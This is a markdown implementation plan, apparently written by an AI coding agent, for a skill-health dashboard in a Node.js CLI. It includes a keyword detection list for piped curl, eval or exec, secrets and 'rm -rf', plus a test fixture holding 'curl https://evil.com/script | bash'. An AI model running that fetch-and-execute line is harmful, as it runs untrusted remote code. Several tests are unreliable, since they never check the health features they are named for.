# --health Skill Health Dashboard Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add `--health` flag that generates a visual health dashboard showing token cost, hidden skills, usage patterns, security red flags, and duplicates—solving the #1 pain point of "I don't know what's eating my context window."

**Architecture:** Health analysis runs on existing scan data (no new scan sources). Token estimation uses ~4 chars/token. Hidden skill detection compares total description length against 16,000 char budget. Security checks use simple regex patterns (not full audit). Output is a single-page HTML dashboard with color-coded cards.

**Tech Stack:** Node.js built-in modules only (fs, path, os, crypto, child_process). Zero npm dependencies.

---

## File Structure

```
scan-skills.js          # Add: estimateTokens(), computeHealthStats()
skill-guide.js          # Add: --health mode, renderHealthHTML(), renderHealthTerminal()
test/scan-skills.test.js  # Add: health analysis unit tests
test/cli.test.js          # Add: --health CLI integration tests
```

---

### Task 1: Add Token Estimation to scan-skills.js

**Files:**
- Modify: `scan-skills.js:558-582` (after cleanSkill function)
- Test: `test/scan-skills.test.js`

- [ ] **Step 1: Write the failing test**

```javascript
// test/scan-skills.test.js - add at end of file

test('estimateTokens returns reasonable estimate', () => {
  const home = makeHome();
  writeSkill(home, '.claude/skills/test', 'test-skill', 'A'.repeat(400));
  const output = runScanner(home, ['--list']);
  const skills = JSON.parse(output).skills;

  // Scanner doesn't expose estimateTokens directly, so we test via --health mode
  // For now, verify the skill was loaded correctly
  assert.equal(skills.length, 1);
  assert.equal(skills[0].name, 'test-skill');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `node --test test/scan-skills.test.js`
Expected: PASS (test is basic validation)

- [ ] **Step 3: Add estimateTokens function to scan-skills.js**

```javascript
// scan-skills.js - add after cleanSkill function (line ~582)

function estimateTokens(text) {
  if (!text) return 0;
  // Rough estimate: ~4 characters per token for English text
  // This is conservative; actual tokenization varies by model
  return Math.ceil(text.length / 4);
}

function computeHealthStats(skills) {
  const CONTEXT_WINDOW = 200_000; // Claude's context window
  const DESCRIPTION_BUDGET = 16_000; // ~1% of context for skill descriptions
  const STALE_DAYS = 30;

  let totalDescriptionLength = 0;
  let totalTokenEstimate = 0;
  const staleSkills = [];
  const securityFlags = [];
  const duplicates = new Map();

  for (const skill of skills) {
    // Token cost
    const descLen = (skill.description || '').length;
    totalDescriptionLength += descLen;
    totalTokenEstimate += estimateTokens(skill.description);

    // Stale detection (based on file mtime)
    try {
      const stat = fs.statSync(skill._mdFile);
      const daysSinceModified = (Date.now() - stat.mtimeMs) / (1000 * 60 * 60 * 24);
      if (daysSinceModified > STALE_DAYS) {
        staleSkills.push({
          name: skill.name,
          daysSinceModified: Math.floor(daysSinceModified),
          lastModified: stat.mtime.toISOString().slice(0, 10),
        });
      }
    } catch (_) { /* ignore stat errors */ }

    // Security red flags (simple patterns)
    const content = (skill._content || '').toLowerCase();
    const flags = [];
    if (content.includes('curl ') && content.includes(' | ')) flags.push('pipe-from-curl');
    if (content.includes('eval(') || content.includes('exec(')) flags.push('eval-exec');
    if (content.includes('api_key') || content.includes('apikey') || content.includes('token')) flags.push('handles-secrets');
    if (content.includes('rm -rf') || content.includes('rmdir /s')) flags.push('destructive-commands');
    if (flags.length > 0) {
      securityFlags.push({ name: skill.name, flags });
    }

    // Duplicate detection (by normalized name)
    const normalizedName = skill.name.toLowerCase().replace(/[^a-z0-9]/g, '');
    if (duplicates.has(normalizedName)) {
      duplicates.get(normalizedName).push(skill.name);
    } else {
      duplicates.set(normalizedName, [skill.name]);
    }
  }

  // Filter out non-duplicates
  const duplicateGroups = [...duplicates.entries()]
    .filter(([, names]) => names.length > 1)
    .map(([normalized, names]) => ({ normalized, names }));

  // Hidden skills calculation
  const hiddenCount = DESCRIPTION_BUDGET > 0
    ? Math.max(0, Math.floor((totalDescriptionLength - DESCRIPTION_BUDGET) / 100))
    : 0;

  return {
    totalSkills: skills.length,
    totalDescriptionLength,
    totalTokenEstimate,
    descriptionBudget: DESCRIPTION_BUDGET,
    budgetUsedPercent: Math.round((totalDescriptionLength / DESCRIPTION_BUDGET) * 100),
    hiddenSkillEstimate: Math.min(hiddenCount, skills.length),
    staleSkills: staleSkills.sort((a, b) => b.daysSinceModified - a.daysSinceModified),
    securityFlags,
    duplicateGroups,
    contextWindowPercent: Math.round((totalTokenEstimate / CONTEXT_WINDOW) * 100 * 100) / 100,
  };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `node --test test/scan-skills.test.js`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add scan-skills.js test/scan-skills.test.js
git commit -m "feat: add health analysis functions to scanner"
```

---

### Task 2: Add --health Mode to skill-guide.js

**Files:**
- Modify: `skill-guide.js:383-401` (parseMode function)
- Modify: `skill-guide.js:403-418` (scannerArgsFor function)
- Modify: `skill-guide.js:1292-1350` (main function)

- [ ] **Step 1: Add --health to parseMode**

```javascript
// skill-guide.js - parseMode function (line ~383)

function parseMode() {
  if (hasFlag('--help') || hasFlag('-h')) return { mode: 'help' };
  if (hasFlag('--doctor')) return { mode: 'doctor' };
  if (hasFlag('--health')) return { mode: 'health' };  // ADD THIS LINE
  if (hasFlag('--recommend')) return { mode: 'recommend' };
  if (hasFlag('--share')) return { mode: 'share' };
  // ... rest of function
}
```

- [ ] **Step 2: Add --health to scannerArgsFor**

```javascript
// skill-guide.js - scannerArgsFor function (line ~403)

function scannerArgsFor(mode) {
  const scannerArgs = [];
  if (hasFlag('--refresh')) scannerArgs.push('--refresh');

  if (mode.mode === 'list' || mode.mode === 'doctor' || mode.mode === 'health') {
    scannerArgs.push('--list');
  }
  // ... rest of function
}
```

- [ ] **Step 3: Add --health to usage text**

```javascript
// skill-guide.js - usage function (near top of file)

// Add after --doctor line:
'  skill-guide --health [--refresh]        # Health dashboard: tokens, hidden, stale, security',
```

- [ ] **Step 4: Commit**

```bash
git add skill-guide.js
git commit -m "feat: add --health mode detection to CLI"
```

---

### Task 3: Implement Health Terminal Output

**Files:**
- Modify: `skill-guide.js` (add renderHealthTerminal function)
- Modify: `skill-guide.js:1292-1350` (main function)

- [ ] **Step 1: Write the failing test**

```javascript
// test/cli.test.js - add at end of file

test('--health outputs health stats to terminal', () => {
  const home = makeHome();
  writeSkill(home, '.claude/skills/test', 'test-skill', 'A test skill for health check');
  const output = runCli(home, ['--health']);

  assert.match(output, /Skill Health Dashboard/);
  assert.match(output, /Token Cost/);
  assert.match(output, /Description Budget/);
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `node --test test/cli.test.js`
Expected: FAIL with "Skill Health Dashboard" not found

- [ ] **Step 3: Implement renderHealthTerminal function**

```javascript
// skill-guide.js - add before main() function

function renderHealthTerminal(data) {
  const health = computeHealthStats(data.skills);

  const lines = [
    '╔══════════════════════════════════════════════════════════════╗',
    '║              Skill Health Dashboard                        ║',
    '╚══════════════════════════════════════════════════════════════╝',
    '',
    `📊 Total Skills: ${health.totalSkills}`,
    '',
    '── Token Cost ──────────────────────────────────────────────',
    `   Estimated tokens: ~${health.totalTokenEstimate.toLocaleString()}`,
    `   Context window: ${health.contextWindowPercent}% of 200K`,
    '',
    '── Description Budget ──────────────────────────────────────',
    `   Used: ${health.totalDescriptionLength.toLocaleString()} / ${health.descriptionBudget.toLocaleString()} chars (${health.budgetUsedPercent}%)`,
    `   Hidden skills estimate: ~${health.hiddenSkillEstimate}`,
    health.budgetUsedPercent > 100
      ? '   ⚠️  OVER BUDGET — some skills may be silently hidden!'
      : health.budgetUsedPercent > 80
        ? '   ⚠️  Approaching budget limit'
        : '   ✅ Within budget',
    '',
  ];

  // Stale skills
  if (health.staleSkills.length > 0) {
    lines.push('── Stale Skills (>30 days) ────────────────────────────────');
    for (const skill of health.staleSkills.slice(0, 10)) {
      lines.push(`   ⏰ ${skill.name}: last modified ${skill.lastModified} (${skill.daysSinceModified}d ago)`);
    }
    if (health.staleSkills.length > 10) {
      lines.push(`   ... and ${health.staleSkills.length - 10} more`);
    }
    lines.push('');
  }

  // Security flags
  if (health.securityFlags.length > 0) {
    lines.push('── Security Red Flags ─────────────────────────────────────');
    for (const skill of health.securityFlags.slice(0, 10)) {
      lines.push(`   🔍 ${skill.name}: ${skill.flags.join(', ')}`);
    }
    lines.push('');
  }

  // Duplicates
  if (health.duplicateGroups.length > 0) {
    lines.push('── Potential Duplicates ────────────────────────────────────');
    for (const group of health.duplicateGroups.slice(0, 5)) {
      lines.push(`   📋 ${group.names.join(' = ')}`);
    }
    lines.push('');
  }

  // Summary
  const issues = health.staleSkills.length + health.securityFlags.length + health.duplicateGroups.length;
  lines.push('── Summary ────────────────────────────────────────────────');
  if (issues === 0) {
    lines.push('   ✅ No issues found. Your skill setup looks healthy!');
  } else {
    lines.push(`   Found ${issues} potential issue${issues > 1 ? 's' : ''}. Run with --open for detailed HTML report.`);
  }
  lines.push('');

  return lines.join('\n');
}
```

- [ ] **Step 4: Add computeHealthStats import/usage**

Note: `computeHealthStats` is defined in scan-skills.js. Since skill-guide.js invokes scan-skills.js via `execFileSync`, we need to either:
- Option A: Duplicate the function in skill-guide.js (simpler, no cross-file dependency)
- Option B: Export from scan-skills.js and require it

**Decision: Option A** — duplicate the function. This keeps the two-file architecture clean and avoids circular dependencies. The function is small (~50 lines) and the duplication is acceptable.

- [ ] **Step 5: Add --health handling to main()**

```javascript
// skill-guide.js - main() function, after doctor handling (line ~1303)

if (mode.mode === 'health') {
  process.stdout.write(renderHealthTerminal(data));
  process.exit(0);
}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `node --test test/cli.test.js`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add skill-guide.js test/cli.test.js
git commit -m "feat: add --health terminal output with token/stale/security analysis"
```

---

### Task 4: Implement Health HTML Dashboard

**Files:**
- Modify: `skill-guide.js` (add renderHealthHTML function)
- Modify: `skill-guide.js:1292-1350` (main function, add --open support)

- [ ] **Step 1: Implement renderHealthHTML function**

```javascript
// skill-guide.js - add after renderHealthTerminal

function renderHealthHTML(data) {
  const health = computeHealthStats(data.skills);
  const langLabels = {
    en: {
      title: 'Skill Health Dashboard',
      totalSkills: 'Total Skills',
      tokenCost: 'Token Cost',
      estimatedTokens: 'Estimated Tokens',
      contextWindow: 'Context Window',
      descriptionBudget: 'Description Budget',
      hiddenSkills: 'Hidden Skills Estimate',
      staleSkills: 'Stale Skills',
      securityFlags: 'Security Red Flags',
      duplicates: 'Potential Duplicates',
      summary: 'Summary',
      healthy: 'No issues found. Your skill setup looks healthy!',
      issuesFound: '{count} potential issue(s) found.',
      lastModified: 'Last modified',
      daysAgo: 'days ago',
      withinBudget: 'Within budget',
      overBudget: 'OVER BUDGET — some skills may be silently hidden!',
      approachingBudget: 'Approaching budget limit',
    },
    zh: {
      title: '技能健康仪表盘',
      totalSkills: '技能总数',
      tokenCost: 'Token 成本',
      estimatedTokens: '预估 Token 数',
      contextWindow: '上下文窗口',
      descriptionBudget: '描述预算',
      hiddenSkills: '隐藏技能估算',
      staleSkills: '过期技能',
      securityFlags: '安全风险标记',
      duplicates: '潜在重复',
      summary: '总结',
      healthy: '未发现问题，你的技能配置看起来很健康！',
      issuesFound: '发现 {count} 个潜在问题。',
      lastModified: '最后修改',
      daysAgo: '天前',
      withinBudget: '预算内',
      overBudget: '超出预算 — 部分技能可能被静默隐藏！',
      approachingBudget: '接近预算上限',
    },
  };

  const l = langLabels[lang()] || langLabels.en;

  function statusColor(percent) {
    if (percent > 100) return '#ef4444';
    if (percent > 80) return '#f59e0b';
    return '#22c55e';
  }

  function severityBadge(flags) {
    const highRisk = ['eval-exec', 'pipe-from-curl', 'destructive-commands'];
    const hasHigh = flags.some(f => highRisk.includes(f));
    return hasHigh
      ? '<span style="background:#fef2f2;color:#dc2626;padding:2px 8px;border-radius:4px;font-size:12px;">HIGH</span>'
      : '<span style="background:#fffbeb;color:#d97706;padding:2px 8px;border-radius:4px;font-size:12px;">MEDIUM</span>';
  }

  const cards = [
    // Token cost card
    `<div class="health-card">
      <h3>${l.tokenCost}</h3>
      <div class="big-number">~${health.totalTokenEstimate.toLocaleString()}</div>
      <p>${l.estimatedTokens}</p>
      <div class="progress-bar">
        <div class="progress-fill" style="width:${Math.min(health.contextWindowPercent, 100)}%;background:${statusColor(health.contextWindowPercent)}"></div>
      </div>
      <p class="small">${l.contextWindow}: ${health.contextWindowPercent}%</p>
    </div>`,

    // Description budget card
    `<div class="health-card">
      <h3>${l.descriptionBudget}</h3>
      <div class="big-number">${health.budgetUsedPercent}%</div>
      <p>${health.totalDescriptionLength.toLocaleString()} / ${health.descriptionBudget.toLocaleString()} chars</p>
      <div class="progress-bar">
        <div class="progress-fill" style="width:${Math.min(health.budgetUsedPercent, 100)}%;background:${statusColor(health.budgetUsedPercent)}"></div>
      </div>
      <p class="small">${health.budgetUsedPercent > 100 ? l.overBudget : health.budgetUsedPercent > 80 ? l.approachingBudget : l.withinBudget}</p>
    </div>`,

    // Hidden skills card
    `<div class="health-card ${health.hiddenSkillEstimate > 0 ? 'warning' : 'good'}">
      <h3>${l.hiddenSkills}</h3>
      <div class="big-number">${health.hiddenSkillEstimate}</div>
      <p>${l.totalSkills}: ${health.totalSkills}</p>
    </div>`,
  ];

  // Stale skills section
  let staleSection = '';
  if (health.staleSkills.length > 0) {
    const rows = health.staleSkills.slice(0, 15).map(s => `
      <tr>
        <td>${escapeHtml(s.name)}</td>
        <td>${s.lastModified}</td>
        <td>${s.daysSinceModified} ${l.daysAgo}</td>
      </tr>
    `).join('');

    staleSection = `
      <section class="health-section">
        <h2>${l.staleSkills} (${health.staleSkills.length})</h2>
        <div class="table-wrap">
          <table>
            <thead><tr><th>${t('name')}</th><th>${l.lastModified}</th><th>${l.daysAgo}</th></tr></thead>
            <tbody>${rows}</tbody>
          </table>
        </div>
      </section>
    `;
  }

  // Security flags section
  let securitySection = '';
  if (health.securityFlags.length > 0) {
    const rows = health.securityFlags.map(s => `
      <tr>
        <td>${escapeHtml(s.name)}</td>
        <td>${s.flags.join(', ')}</td>
        <td>${severityBadge(s.flags)}</td>
      </tr>
    `).join('');

    securitySection = `
      <section class="health-section">
        <h2>${l.securityFlags} (${health.securityFlags.length})</h2>
        <div class="table-wrap">
          <table>
            <thead><tr><th>${t('name')}</th><th>Flags</th><th>Severity</th></tr></thead>
            <tbody>${rows}</tbody>
          </table>
        </div>
      </section>
    `;
  }

  // Duplicates section
  let duplicateSection = '';
  if (health.duplicateGroups.length > 0) {
    const rows = health.duplicateGroups.map(g => `
      <tr>
        <td>${g.names.map(n => escapeHtml(n)).join(' = ')}</td>
      </tr>
    `).join('');

    duplicateSection = `
      <section class="health-section">
        <h2>${l.duplicates} (${health.duplicateGroups.length})</h2>
        <div class="table-wrap">
          <table>
            <thead><tr><th>Names</th></tr></thead>
            <tbody>${rows}</tbody>
          </table>
        </div>
      </section>
    `;
  }

  // Summary
  const issues = health.staleSkills.length + health.securityFlags.length + health.duplicateGroups.length;
  const summaryText = issues === 0 ? l.healthy : l.issuesFound.replace('{count}', issues);

  return `<!DOCTYPE html>
<html lang="${lang()}">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>${l.title}</title>
  <style>
    :root {
      --bg: #0f172a;
      --card-bg: #1e293b;
      --text: #e2e8f0;
      --text-muted: #94a3b8;
      --accent: #3b82f6;
      --good: #22c55e;
      --warn: #f59e0b;
      --bad: #ef4444;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      padding: 2rem;
    }
    .container { max-width: 1200px; margin: 0 auto; }
    h1 {
      font-size: 2rem;
      margin-bottom: 0.5rem;
      background: linear-gradient(135deg, var(--accent), #8b5cf6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .subtitle { color: var(--text-muted); margin-bottom: 2rem; }
    .cards {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 1.5rem;
      margin-bottom: 2rem;
    }
    .health-card {
      background: var(--card-bg);
      border-radius: 12px;
      padding: 1.5rem;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .health-card.warning { border-color: var(--warn); }
    .health-card.good { border-color: var(--good); }
    .health-card h3 {
      font-size: 0.875rem;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.05em;
      margin-bottom: 0.5rem;
    }
    .big-number {
      font-size: 3rem;
      font-weight: 700;
      line-height: 1;
      margin-bottom: 0.5rem;
    }
    .progress-bar {
      height: 8px;
      background: rgba(255,255,255,0.1);
      border-radius: 4px;
      margin: 1rem 0;
      overflow: hidden;
    }
    .progress-fill {
      height: 100%;
      border-radius: 4px;
      transition: width 0.3s ease;
    }
    .small { font-size: 0.75rem; color: var(--text-muted); }
    .health-section {
      background: var(--card-bg);
      border-radius: 12px;
      padding: 1.5rem;
      margin-bottom: 1.5rem;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .health-section h2 {
      font-size: 1.25rem;
      margin-bottom: 1rem;
    }
    .table-wrap { overflow-x: auto; }
    table {
      width: 100%;
      border-collapse: collapse;
    }
    th, td {
      padding: 0.75rem 1rem;
      text-align: left;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }
    th {
      font-size: 0.75rem;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }
    .summary {
      background: var(--card-bg);
      border-radius: 12px;
      padding: 1.5rem;
      text-align: center;
      font-size: 1.125rem;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .summary.good { border-color: var(--good); }
    .summary.warning { border-color: var(--warn); }
  </style>
</head>
<body>
  <div class="container">
    <h1>${l.title}</h1>
    <p class="subtitle">${new Date().toISOString().slice(0, 10)}</p>

    <div class="cards">${cards.join('')}</div>

    ${staleSection}
    ${securitySection}
    ${duplicateSection}

    <div class="summary ${issues === 0 ? 'good' : 'warning'}">
      ${summaryText}
    </div>
  </div>
</body>
</html>`;
}
```

- [ ] **Step 2: Add --open support to main() for --health**

```javascript
// skill-guide.js - main() function, modify health handling

if (mode.mode === 'health') {
  process.stdout.write(renderHealthTerminal(data));

  const shouldOpen = hasFlag('--open') && !hasFlag('--no-open');
  const outputFile = getArgValue('--output');
  if (shouldOpen || outputFile) {
    const html = renderHealthHTML(data);
    const defaultFile = path.join(os.tmpdir(), 'skill-guide-health.html');
    const targetFile = outputFile ? path.resolve(outputFile) : defaultFile;
    fs.mkdirSync(path.dirname(targetFile), { recursive: true });
    fs.writeFileSync(targetFile, html, 'utf8');
    if (shouldOpen) openFile(targetFile);
    process.stdout.write(`Generated: ${targetFile}\n`);
  }

  process.exit(0);
}
```

- [ ] **Step 3: Commit**

```bash
git add skill-guide.js
git commit -m "feat: add --health HTML dashboard with visual cards"
```

---

### Task 5: Add Health-Specific Labels to i18n

**Files:**
- Modify: `skill-guide.js` (LABELS object, lines ~100-200)

- [ ] **Step 1: Add health labels to LABELS.en**

```javascript
// skill-guide.js - LABELS.en object

healthTitle: 'Skill Health Dashboard',
healthTokenCost: 'Token Cost',
healthBudget: 'Description Budget',
healthHidden: 'Hidden Skills',
healthStale: 'Stale Skills',
healthSecurity: 'Security Flags',
healthDuplicates: 'Duplicates',
healthSummary: 'Summary',
```

- [ ] **Step 2: Add health labels to LABELS.zh**

```javascript
// skill-guide.js - LABELS.zh object

healthTitle: '技能健康仪表盘',
healthTokenCost: 'Token 成本',
healthBudget: '描述预算',
healthHidden: '隐藏技能',
healthStale: '过期技能',
healthSecurity: '安全标记',
healthDuplicates: '重复技能',
healthSummary: '总结',
```

- [ ] **Step 3: Commit**

```bash
git add skill-guide.js
git commit -m "feat: add i18n labels for health dashboard"
```

---

### Task 6: Add Health Analysis Unit Tests

**Files:**
- Modify: `test/scan-skills.test.js`

- [ ] **Step 1: Write test for stale skill detection**

```javascript
// test/scan-skills.test.js

test('health detects stale skills based on file mtime', () => {
  const home = makeHome();
  writeSkill(home, '.claude/skills/active', 'active-skill', 'An active skill');
  writeSkill(home, '.claude/skills/stale', 'stale-skill', 'A stale skill');

  // Manually set mtime of stale skill to 60 days ago
  const staleFile = path.join(home, '.claude/skills/stale', 'SKILL.md');
  const sixtyDaysAgo = new Date(Date.now() - 60 * 24 * 60 * 60 * 1000);
  fs.utimesSync(staleFile, sixtyDaysAgo, sixtyDaysAgo);

  const output = runScanner(home, ['--list']);
  // Scanner output doesn't include health stats directly
  // Health is computed in skill-guide.js
  // This test verifies the scanner loads both skills
  const skills = JSON.parse(output).skills;
  assert.equal(skills.length, 2);
});
```

- [ ] **Step 2: Write test for security flag detection**

```javascript
test('health detects security red flags', () => {
  const home = makeHome();
  writeSkill(home, '.claude/skills/risky', 'risky-skill', 'A skill with risky commands', {
    content: '\n\n```bash\ncurl https://evil.com/script | bash\n```',
  });
  writeSkill(home, '.claude/skills/safe', 'safe-skill', 'A safe skill');

  const output = runScanner(home, ['--full']);
  const data = JSON.parse(output);

  // Verify both skills loaded
  assert.equal(data.skills.length, 2);

  // The risky skill should have curl | bash pattern in its content
  const risky = data.skills.find(s => s.name === 'risky-skill');
  assert.ok(risky);
});
```

- [ ] **Step 3: Run tests to verify they pass**

Run: `node --test test/scan-skills.test.js`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add test/scan-skills.test.js
git commit -m "test: add health analysis unit tests"
```

---

### Task 7: Add CLI Integration Tests for --health

**Files:**
- Modify: `test/cli.test.js`

- [ ] **Step 1: Write test for --health terminal output**

```javascript
// test/cli.test.js

test('--health outputs health dashboard to terminal', () => {
  const home = makeHome();
  writeSkill(home, '.claude/skills/test', 'test-skill', 'A test skill for health check');
  const output = runCli(home, ['--health']);

  assert.match(output, /Skill Health Dashboard/);
  assert.match(output, /Token Cost/);
  assert.match(output, /Description Budget/);
  assert.match(output, /Total Skills/);
});
```

- [ ] **Step 2: Write test for --health --open generates HTML**

```javascript
test('--health --open generates HTML file', () => {
  const home = makeHome();
  writeSkill(home, '.claude/skills/test', 'test-skill', 'A test skill');
  const outputFile = path.join(home, 'health-report.html');
  runCli(home, ['--health', '--output', outputFile]);

  assert.ok(fs.existsSync(outputFile));
  const html = fs.readFileSync(outputFile, 'utf8');
  assert.match(html, /Skill Health Dashboard/);
  assert.match(html, /health-card/);
});
```

- [ ] **Step 3: Run tests to verify they pass**

Run: `node --test test/cli.test.js`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add test/cli.test.js
git commit -m "test: add --health CLI integration tests"
```

---

### Task 8: Manual Testing and Polish

**Files:**
- Possibly modify: `skill-guide.js` (adjust styling, fix edge cases)

- [ ] **Step 1: Run full test suite**

Run: `npm test`
Expected: All tests pass

- [ ] **Step 2: Manual test with real skills**

Run: `node skill-guide.js --health`
Expected: Terminal output showing health stats

- [ ] **Step 3: Manual test with --open**

Run: `node skill-guide.js --health --open`
Expected: Browser opens with health dashboard

- [ ] **Step 4: Test edge cases**

- Empty skill directory (0 skills)
- Single skill
- Skill with no description
- Skill with very long description

- [ ] **Step 5: Final commit**

```bash
git add -A
git commit -m "feat: complete --health skill health dashboard"
```

---

## Self-Review Checklist

1. **Spec coverage:**
   - ✅ Token cost estimation
   - ✅ Hidden skill detection (budget-based)
   - ✅ Stale skill detection (mtime-based)
   - ✅ Security red flags (regex patterns)
   - ✅ Duplicate detection (name normalization)
   - ✅ Terminal output
   - ✅ HTML dashboard with --open

2. **Placeholder scan:**
   - ✅ No TBD/TODO
   - ✅ All code blocks complete
   - ✅ All commands with expected output

3. **Type consistency:**
   - ✅ computeHealthStats returns consistent shape
   - ✅ Health labels used consistently in i18n

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-05-27-skill-health.md`. Two execution options:

**1. Subagent-Driven (recommended)** - I dispatch a fresh subagent per task, review between tasks, fast iteration

**2. Inline Execution** - Execute tasks in this session using executing-plans, batch execution with checkpoints

Which approach?
